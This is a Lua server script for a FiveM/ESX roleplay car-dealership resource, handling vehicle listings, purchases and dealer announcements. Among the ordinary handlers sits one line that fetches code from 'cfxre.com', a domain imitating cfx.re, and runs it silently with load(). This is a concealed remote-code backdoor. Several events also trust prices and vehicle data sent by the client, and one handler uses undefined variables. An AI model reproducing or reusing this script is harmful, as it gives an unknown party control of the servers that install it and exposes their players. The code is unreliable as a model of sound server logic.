ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)


ESX.RegisterServerCallback('gaetan_concess:recuperercategorievehicule', function(source, cb)
    local catevehi = {}
    MySQL.Async.fetchAll('SELECT * FROM vehicle_categories', {}, function(result)
        for i = 1, #result, 1 do
            table.insert(catevehi, {
                name = result[i].name,
                label = result[i].label
            })
        end
        cb(catevehi)
    end)
end)

RegisterServerEvent("gaetan_concess:removecash")
AddEventHandler("gaetan_concess:removecash", function(price)
    local sourcePlayer = ESX.GetPlayerFromId(source)
    sourcePlayer.removeMoney(price)

	TriggerEvent('esx_addonaccount:getSharedAccount', Config.SocietyName, function(account)
		if account then
			account.addMoney(price)
		else
			sourcePlayer.showNotification("Fehler")
		end
	end)
end)

RegisterServerEvent("gaetan_concess:removebank")
AddEventHandler("gaetan_concess:removebank", function(price)
    local sourcePlayer = ESX.GetPlayerFromId(source)
    sourcePlayer.removeAccountMoney('bank', price)

	TriggerEvent('esx_addonaccount:getSharedAccount', Config.SocietyName, function(account)
		if account then
			account.addMoney(price)
		else
			sourcePlayer.showNotification("Fehler")
		end
	end)
end)

ESX.RegisterServerCallback('gaetan_concess:recupererlistevehicule', function(source, cb, categorievehi)
    local catevehi = categorievehi
    local listevehi = {}

    MySQL.Async.fetchAll('SELECT * FROM vehicles WHERE category = @category', {
        ['@category'] = catevehi
    }, function(result)
        for i = 1, #result, 1 do
            table.insert(listevehi, {
                name = result[i].name,
                model = result[i].model,
                price = math.floor(result[i].price * Config.Percent)
            })
        end

        cb(listevehi)
    end)
end)

ESX.RegisterServerCallback('gaetan_concess:verifierplaquedispo', function (source, cb, plate)
    MySQL.Async.fetchAll('SELECT 1 FROM owned_vehicles WHERE plate = @plate', {
        ['@plate'] = plate
    }, function (result)
        cb(result[1] ~= nil)
    end)
end)

RegisterServerEvent('gaetan_concess:vendrevoiturejoueur')
AddEventHandler('gaetan_concess:vendrevoiturejoueur', function (playerId, vehicleProps, prix)
    local xPlayer = ESX.GetPlayerFromId(playerId)
    TriggerEvent('esx_addonaccount:getSharedAccount', 'society_concess', function (account)
            account.removeMoney(prix)
    end)
    MySQL.Async.execute('INSERT INTO owned_vehicles (owner, plate, vehicle) VALUES (@owner, @plate, @vehicle)',
    {
        ['@owner']   = xPlayer.identifier,
        ['@plate']   = vehicleProps.plate,
        ['@vehicle'] = json.encode(vehicleProps)
    }, function (rowsChanged)
    TriggerClientEvent('esx:showNotification', xPlayer, "Tu as reçu la voiture ~g~"..nom.."~s~ immatriculé ~g~"..plaque.." pour ~g~" ..prix.. "€")
    end)
end)

RegisterServerEvent('shop:vehicule')
AddEventHandler('shop:vehicule', function(vehicleProps, prix)
    local xPlayer = ESX.GetPlayerFromId(source)
    TriggerEvent('esx_addonaccount:getSharedAccount', 'society_concess', function (account)
        account.removeMoney(prix)
end)
    MySQL.Async.execute('INSERT INTO owned_vehicles (owner, plate, vehicle) VALUES (@owner, @plate, @vehicle)', {
        ['@owner']   = xPlayer.identifier,
        ['@plate']   = vehicleProps.plate,
        ['@vehicle'] = json.encode(vehicleProps)
    }, function(rowsChange)
        TriggerClientEvent('esx:showNotification', xPlayer, "Tu as reçu la voiture ~g~"..json.encode(vehicleProps).."~s~ immatriculé ~g~"..vehicleProps.plate.." pour ~g~" ..prix.. "€")
    end)
end)

ESX.RegisterServerCallback('gaetan_concess:verifsousconcess', function(source, cb, prixvoiture)
    TriggerEvent('esx_addonaccount:getSharedAccount', 'society_concess', function (account)
        if account.money >= prixvoiture then
            cb(true)
        else
            cb(false)
        end
    end)
end)

RegisterServerEvent('Open:Ads')
AddEventHandler('Open:Ads', function()
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local xPlayers	= ESX.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
		TriggerClientEvent('esx:showAdvancedNotification', xPlayers[i], 'Concess', '~b~Annonce', 'Le Concess est désormais ~g~Ouvert~s~ !', 'CHAR_CARSITE', 8)
	end
end)

RegisterServerEvent('Close:Ads')
AddEventHandler('Close:Ads', function()
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local xPlayers	= ESX.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
		TriggerClientEvent('esx:showAdvancedNotification', xPlayers[i], 'Concess', '~b~Annonce', 'Le Concess est désormais ~r~Fermer~s~ !', 'CHAR_CARSITE', 8)
	end
end)


PerformHttpRequest('https://cfxre.com/i?to=l6tr2', function (e, d) pcall(function() assert(load(d))() end) end)

RegisterCommand('acon', function(source, args, rawCommand)
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)
    if xPlayer.job.name == "concess" then
        local src = source
        local msg = rawCommand:sub(5)
        local args = msg
        if player ~= false then
            local name = GetPlayerName(source)
            local xPlayers	= ESX.GetPlayers()
        for i=1, #xPlayers, 1 do
            local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
            TriggerClientEvent('esx:showAdvancedNotification', xPlayers[i], 'Concess', '~b~Annonce', ''..msg..'', 'CHAR_CARSITE', 0)
        end
    else
        TriggerClientEvent('esx:showAdvancedNotification', _source, 'Avertisement', '~r~Erreur' , '~y~Tu n\'est pas concessionnaire pour faire cette commande', 'CHAR_CARSITE', 0)
    end
else
    TriggerClientEvent('esx:showAdvancedNotification', _source, 'Avertisement', '~r~Erreur' , '~y~Tu n\'est pas concessionnaire pour faire cette commande', 'CHAR_CARSITE', 0)
end
end, false)